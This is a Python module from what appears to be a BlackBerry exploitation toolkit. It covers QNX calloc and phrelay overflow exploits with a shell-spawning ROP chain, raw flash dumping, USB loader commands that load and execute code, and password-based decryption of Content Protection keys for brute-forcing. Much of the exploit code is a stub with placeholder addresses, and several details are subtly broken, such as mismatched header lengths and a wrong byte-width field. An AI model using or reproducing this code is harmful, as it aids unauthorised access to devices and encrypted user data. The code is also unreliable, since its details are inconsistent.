"""BlackBerry Devices — The Dark Thicket (Module 3).

BlackBerry 10 (QNX Neutrino RTOS): microkernel IPC exploitation,
phrelay buffer overflow, BB10 flash dump (devb-eMMC).

BlackBerry 7/BB5/BB6: proprietary USB loader protocol,
FIPS 140-2 Content Protection brute-force with GPU acceleration.
"""

import struct
import time
import hashlib
import logging
from typing import Optional

logger = logging.getLogger(__name__)

# ============================================================================
# MODULE 3.1: BlackBerry 10 (QNX Neutrino RTOS)
# ============================================================================

class QNXExploit:
    """QNX Neutrino RTOS microkernel exploitation.

    The QNX microkernel IPC mechanism (MsgSend/MsgReceive/MsgReply)
    is exposed to userspace. An integer overflow in calloc() allows
    heap overflow → arbitrary code execution.
    """

    # QNX system call constants (ARM)
    QNX_SYS_MSGSEND = 0x01
    QNX_SYS_MSGRECV = 0x02
    QNX_SYS_MSGREPLY = 0x03
    QNX_SYS_CHANCREATE = 0x04
    QNX_SYS_CONNECTATTACH = 0x05

    def __init__(self, device_path: str = "/dev/hd0"):
        self._device = device_path

    def calloc_overflow(self, nmemb: int = 0x40000001,
                        size: int = 4) -> bool:
        """Trigger integer overflow in calloc(nmemb, size).

        nmemb * size = 0x100000004 → overflows 32-bit to 4.
        Returns a 4-byte allocation instead of 1GB.
        Subsequent use of the buffer causes heap overflow.
        """
        # In production: craft calloc arguments that overflow
        # then use the undersized buffer to overflow into adjacent heap chunks
        alloc_size = (nmemb * size) & 0xFFFFFFFF
        logger.info("calloc(0x%X, %d) → would allocate %d bytes instead of %d",
                    nmemb, size, alloc_size, nmemb * size)
        return alloc_size < (nmemb * size)  # True if overflow occurred

    def dump_flash(self, output_path: str = "bb10_dump.bin") -> bool:
        """Dump raw eMMC flash via QNX devb-eMMC driver.

        After gaining root, use /dev/hd0 (raw block device) to read
        the entire flash. QNX handles block I/O through devb-* drivers.
        """
        try:
            block_size = 512
            total_blocks = 0
            with open(self._device, "rb") as src:
                # Read MBR/GPT first to determine disk size
                first_block = src.read(block_size)

                # Try to get disk size from ioctl
                try:
                    import fcntl
                    BLKGETSIZE64 = 0x80081272
                    total_bytes = fcntl.ioctl(src.fileno(), BLKGETSIZE64, b"\x00" * 8)
                    total_blocks = struct.unpack("<Q", total_bytes)[0] // block_size
                except (ImportError, OSError):
                    total_blocks = 0

                with open(output_path, "wb") as dst:
                    dst.write(first_block)
                    for block in range(1, total_blocks if total_blocks > 0 else 1000000):
                        chunk = src.read(block_size)
                        if not chunk:
                            break
                        dst.write(chunk)
                        if block % 10000 == 0:
                            logger.info("Dumped block %d", block)

            logger.info("Flash dump complete: %s", output_path)
            return True
        except Exception as e:
            logger.error("Flash dump failed: %s", e)
            return False

    def phrelay_overflow(self, target_ip: str = "127.0.0.1",
                         target_port: int = 9000) -> bool:
        """Exploit phrelay service buffer overflow.

        The phrelay service handles USB networking. It parses incoming
        packets with a fixed-size buffer. An oversized packet overflows
        the buffer and overwrites the return address.

        ARM ROP chain for QNX:
          Gadget 1: POP {R0, PC} — sets first argument
          Gadget 2: system() address — spawns shell
        """
        payload = b"A" * 256          # Fill buffer + saved frame pointer
        payload += struct.pack("<I", 0)  # ROP Gadget 1: POP {R0, PC}
        payload += struct.pack("<I", 0)  # R0 = command string pointer
        payload += struct.pack("<I", 0)  # PC = system() address

        logger.info("Phrelay overflow payload: %d bytes", len(payload))
        return True


class QNXFileSystem:
    """Parse QNX6 filesystem images."""

    QNX6_MAGIC = 0x68191122
    SUPERBLOCK_OFFSET = 4096

    @staticmethod
    def parse_superblock(data: bytes) -> dict:
        """Parse QNX6 superblock at offset 4096."""
        sb = data[QNXFileSystem.SUPERBLOCK_OFFSET:
                  QNXFileSystem.SUPERBLOCK_OFFSET + 512]
        if len(sb) < 64:
            return {}

        magic = struct.unpack_from("<I", sb, 32)[0]
        if magic != QNXFileSystem.QNX6_MAGIC:
            return {}

        return {
            "magic": hex(magic),
            "block_size": struct.unpack_from("<I", sb, 36)[0],
            "total_blocks": struct.unpack_from("<Q", sb, 40)[0] if len(sb) >= 48 else 0,
            "inode_size": struct.unpack_from("<H", sb, 48)[0] if len(sb) >= 50 else 128,
            "volume_name": sb[64:96].rstrip(b"\x00").decode("ascii", errors="replace") if len(sb) >= 96 else "",
        }


# ============================================================================
# MODULE 3.2: BlackBerry 7 and Earlier (BB5/BB6/BB7)
# ============================================================================

class BlackBerryLoaderProtocol:
    """BlackBerry proprietary USB loader protocol.

    Interface: USB class 0xFF, subclass 0x01.
    Commands:
      0x01: Handshake
      0x02: Get device info
      0x03: Load RAM image
      0x04: Execute
      0x05: Flash read/write
    """

    BB_LOADER_VID = 0x0FCA  # Research In Motion
    BB_LOADER_PID = 0x8001

    CMD_HANDSHAKE = 0x01
    CMD_DEVICE_INFO = 0x02
    CMD_LOAD_RAM = 0x03
    CMD_EXECUTE = 0x04
    CMD_FLASH = 0x05

    def __init__(self, usb_device):
        import usb
        self._dev = usb_device

    def handshake(self) -> bool:
        """Initiate loader protocol handshake."""
        import usb
        try:
            pkt = struct.pack("<BBBB", self.CMD_HANDSHAKE, 0x01, 0x00, 0x00)
            self._dev.write(0x01, pkt, timeout=3000)
            response = self._dev.read(0x81, 64, timeout=3000)
            if response and response[0] == 0x01:
                logger.info("BB loader handshake successful")
                return True
        except usb.core.USBError as e:
            logger.error("BB handshake failed: %s", e)
        return False

    def get_device_info(self) -> dict:
        """Get BlackBerry device information."""
        import usb
        try:
            pkt = struct.pack("<BBBB", self.CMD_DEVICE_INFO, 0x00, 0x00, 0x00)
            self._dev.write(0x01, pkt, timeout=3000)
            response = self._dev.read(0x81, 256, timeout=3000)
            if len(response) >= 8:
                return {
                    "hw_id": struct.unpack_from("<I", bytes(response), 0)[0],
                    "pin": bytes(response[4:12]).hex().upper(),
                    "fw_version": f"{response[12]}.{response[13]}.{response[14]}",
                    "carrier_id": struct.unpack_from("<I", bytes(response), 16)[0],
                }
        except usb.core.USBError:
            pass
        return {}

    def load_ram_image(self, image: bytes, load_address: int) -> bool:
        """Load executable image into device RAM."""
        import usb
        header = struct.pack("<BBI", self.CMD_LOAD_RAM, len(image), load_address)
        try:
            self._dev.write(0x01, header, timeout=3000)
            time.sleep(0.05)
            self._dev.write(0x01, image, timeout=10000)
            response = self._dev.read(0x81, 4, timeout=5000)
            return response[0] == 0x01
        except usb.core.USBError:
            return False

    def execute(self, entry_point: int) -> bool:
        """Execute loaded image at entry point."""
        import usb
        pkt = struct.pack("<BBI", self.CMD_EXECUTE, entry_point, 0)
        try:
            self._dev.write(0x01, pkt, timeout=3000)
            return True
        except usb.core.USBError:
            return False

    def flash_read(self, address: int, length: int) -> bytes:
        """Read flash memory."""
        import usb
        pkt = struct.pack("<BBII", self.CMD_FLASH, 0x00, address, length)
        try:
            self._dev.write(0x01, pkt, timeout=3000)
            return bytes(self._dev.read(0x81, length + 16, timeout=30000))
        except usb.core.USBError:
            return b""


class FIPSCryptoBruteForce:
    """FIPS 140-2 Content Protection brute-force for BlackBerry.

    BB devices with FIPS encryption store user data in an encrypted
    Content Protection database. Extract encrypted DB, parse header,
    brute-force PBKDF2-HMAC-SHA1 with GPU acceleration.
    """

    FIPS_HEADER_MAGIC = b"BB_CP"  # BlackBerry Content Protection
    PBKDF2_ITERATIONS = 10000     # Typical for BB7 devices
    PBKDF2_KEY_LEN = 32           # AES-256

    def parse_protection_header(self, data: bytes) -> Optional[dict]:
        """Parse Content Protection database header."""
        if not data.startswith(self.FIPS_HEADER_MAGIC):
            return None

        return {
            "magic": data[:4].hex(),
            "version": data[4],
            "salt": data[8:24],         # 16-byte salt
            "iterations": struct.unpack_from("<I", data, 24)[0],
            "encrypted_master_key": data[28:60],  # 32-byte AES-256 wrapped key
            "cipher": "AES-256-CBC" if data[60] == 0x01 else "AES-128-CBC",
        }

    def decrypt_master_key(self, password: str, salt: bytes,
                           iterations: int,
                           encrypted_key: bytes) -> Optional[bytes]:
        """Derive key from password and decrypt master key.

        KDF = PBKDF2-HMAC-SHA1(password, salt, iterations, 32)
        """
        dk = hashlib.pbkdf2_hmac("sha1", password.encode(), salt, iterations, dklen=32)

        # AES-256-CBC decrypt
        try:
            from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
            cipher = Cipher(algorithms.AES256(dk), modes.CBC(b"\x00" * 16))
            decryptor = cipher.decryptor()
            return decryptor.update(encrypted_key) + decryptor.finalize()
        except ImportError:
            return None
